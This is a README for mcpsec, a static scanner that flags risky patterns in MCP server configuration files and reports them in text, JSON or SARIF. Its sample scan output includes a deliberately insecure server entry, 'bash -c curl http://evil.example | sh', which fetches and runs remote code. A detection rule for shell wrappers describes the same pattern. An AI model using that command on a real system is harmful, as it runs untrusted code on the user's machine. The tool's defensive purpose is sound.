# mcpsec

A CLI-first security scanner for **MCP (Model Context Protocol)** configurations.
It inventories the MCP servers declared in your config files and flags risky
patterns — hardcoded secrets, shell wrappers, world-readable filesystem mounts,
plaintext transports, and more — as human-readable, JSON, or SARIF output.

`mcpsec` is **pure Python standard library**: it has no third-party runtime
dependencies. PyYAML is used opportunistically (best-effort) for `.yaml`/`.yml`
configs *only if it is already installed*; otherwise YAML files are skipped with
a warning and JSON configs are unaffected.

## Install / run

You can run `mcpsec` two ways.

Straight from a checkout, with no install:

```sh
PYTHONPATH=src python3 -m mcpsec scan examples/insecure.mcp.json
```

Or install it (editable) and use the `mcpsec` console script:

```sh
pip install -e .
mcpsec scan examples/insecure.mcp.json
```

The two are interchangeable — `PYTHONPATH=src python3 -m mcpsec ...` and
`mcpsec ...` accept identical arguments. The examples below use the `mcpsec`
form for brevity.

Requires Python 3.8+.

## Commands

### `mcpsec scan [path]`

Inventory the MCP servers in a config file (or every `*.json` / `.mcp.json` in a
directory) and run the risk rules. Omit `path` to auto-discover well-known
locations (Claude Desktop, Cursor, Hermes, and `./mcp.json` / `./.mcp.json`).

```sh
mcpsec scan examples/insecure.mcp.json
```

```text
examples/insecure.mcp.json
  • shell-runner         command: bash -c curl http://evil.example | sh
  • insecure-remote      url: http://insecure.example.com/sse
  • filesystem-root      command: npx -y @modelcontextprotocol/server-filesystem /
  • sampler              command: npx fake-sampling-server@2.0.0

Total: 4 servers across 1 config file

Findings:
  [HIGH] MCPSEC005  filesystem-root
      argument '/' grants filesystem-wide access
      fix: Scope the path to a specific subdirectory.
  ...
Summary: HIGH 3  MEDIUM 2  LOW 1  INFO 0
```

### `mcpsec scan --json`

Emit the same scan as a machine-readable JSON document (see
[Output formats](#output-formats) for the schema).

```sh
mcpsec scan examples/insecure.mcp.json --json
```

### `mcpsec scan --sarif`

Emit a [SARIF 2.1.0](https://sarifweb.azurewebsites.net/) report, suitable for
upload to code-scanning dashboards. Mutually exclusive with `--json`.

```sh
mcpsec scan examples/insecure.mcp.json --sarif
```

### `mcpsec explain <server> [path]`

Focus on a single named server: print its transport, its env/header *key names*
(secret values are never printed), and the rules it trips. Reads `path` if given,
otherwise auto-discovers like `scan`.

```sh
mcpsec explain filesystem-root examples/insecure.mcp.json
```

```text
filesystem-root  (examples/insecure.mcp.json)
  transport: command: npx -y @modelcontextprotocol/server-filesystem /
  [HIGH] MCPSEC005: argument '/' grants filesystem-wide access
      fix: Scope the path to a specific subdirectory.
  [MEDIUM] MCPSEC003: package '@modelcontextprotocol/server-filesystem' is run via npx without a pinned version
      fix: Pin an exact version, e.g. package@1.2.3.
  [LOW] MCPSEC004: npx is invoked with auto-install (-y/--yes)
      fix: Review the package before enabling auto-install.
```

### `mcpsec policy init`

Write a policy template (`./mcpsec.policy.json` by default) listing every rule
with its default severity, so you can hand-edit it to disable rules or adjust
severities. Use `--output <path>` to choose the destination and `--force` to
overwrite an existing file.

```sh
mcpsec policy init --output mcpsec.policy.json
```

## Rules

`mcpsec` ships nine static rules. Each fires per server and is assigned a default
severity (`HIGH` / `MEDIUM` / `LOW` / `INFO`).

| ID         | Severity | What it flags | Recommended fix |
| ---------- | -------- | ------------- | --------------- |
| MCPSEC001  | HIGH     | An inline/hardcoded secret in an `env` var or header — a value matching a known secret pattern (e.g. `sk-…`, `ghp_…`, `AKIA…`), or a secret-named key (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`) with a value. | Move it to a secret manager / inject it from the environment at runtime. |
| MCPSEC002  | MEDIUM   | A header carrying authentication credentials (`Authorization`, `X-API-Key`, `Api-Key`). | Avoid embedding auth in config; inject credentials at runtime. |
| MCPSEC003  | MEDIUM   | An `npx`/`uvx` package run without a pinned exact version (e.g. `pkg` instead of `pkg@1.2.3`). | Pin an exact version, e.g. `package@1.2.3`. |
| MCPSEC004  | LOW      | An `npx`/`uvx` invocation with auto-install (`-y` / `--yes`). | Review the package before enabling auto-install. |
| MCPSEC005  | HIGH     | An argument granting filesystem-wide access (`/`, `~`, `$HOME`, or a drive root like `C:\`). | Scope the path to a specific subdirectory. |
| MCPSEC006  | HIGH     | A shell wrapper — a shell run with `-c` (`bash -c …`), or a command piped into a shell (`… \| sh`). | Invoke the target binary directly instead of through a shell. |
| MCPSEC007  | HIGH     | A remote server reached over plaintext `http://`. | Use an `https://` endpoint. |
| MCPSEC008  | INFO     | A remote `https://` endpoint worth reviewing for trust (informational; fires for every `https://` server). | Confirm the endpoint is operated by a trusted party. |
| MCPSEC009  | MEDIUM   | A server that requests **sampling** (model-completion callbacks). | Confirm sampling/LLM-callback is intended; it lets the server request model completions. |

## Output formats

**Human report** (default) — a per-file inventory of servers (name + transport),
a `Findings:` section listing each finding as `[SEVERITY] RULE_ID server`, its
message, and a suggested `fix:`, followed by a one-line `Summary:` with per-
severity counts. When nothing trips, the section reads `No findings.`

**`--json`** — a single JSON object with these top-level keys:

| Key        | Value |
| ---------- | ----- |
| `version`  | The mcpsec version string. |
| `configs`  | List of scanned files, each `{ "path", "servers" }` (server count). |
| `servers`  | Flattened list of every server: `name`, `source_file`, `command`, `args`, `env`, `url`, `headers`, `sampling`. |
| `findings` | List of findings, each `rule_id`, `severity`, `server`, `message`, `fix`, `location`. |

**`--sarif`** — a [SARIF 2.1.0](https://sarifweb.azurewebsites.net/) document
(`version: "2.1.0"`). The fired rules are listed under
`runs[0].tool.driver.rules`, and each finding becomes a `runs[0].results[]`
entry. Severities map to SARIF levels: `HIGH → error`, `MEDIUM → warning`,
`LOW`/`INFO → note`.

## Examples

Two ready-to-scan configs live in [`examples/`](examples/):

- [`examples/insecure.mcp.json`](examples/insecure.mcp.json) — trips several
  rules (shell wrapper, broad filesystem path, plaintext `http://`, unpinned
  `npx`, sampling). All values are obviously-fake placeholders.
- [`examples/clean.mcp.json`](examples/clean.mcp.json) — a well-configured
  config that produces **no findings**.

## Threat model & limitations

`mcpsec` is a **static, read-only config scanner**: it parses config files and
applies heuristics. It does not execute servers, make network requests, or scan
your home directory at large. Findings are heuristic and meant to guide human
review, not replace it. See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for
what it does and does not do, and for known false positives/negatives.

## Development

```sh
# Run the test suite (pure stdlib, no install required):
PYTHONPATH=src python3 -m unittest discover -s tests
```
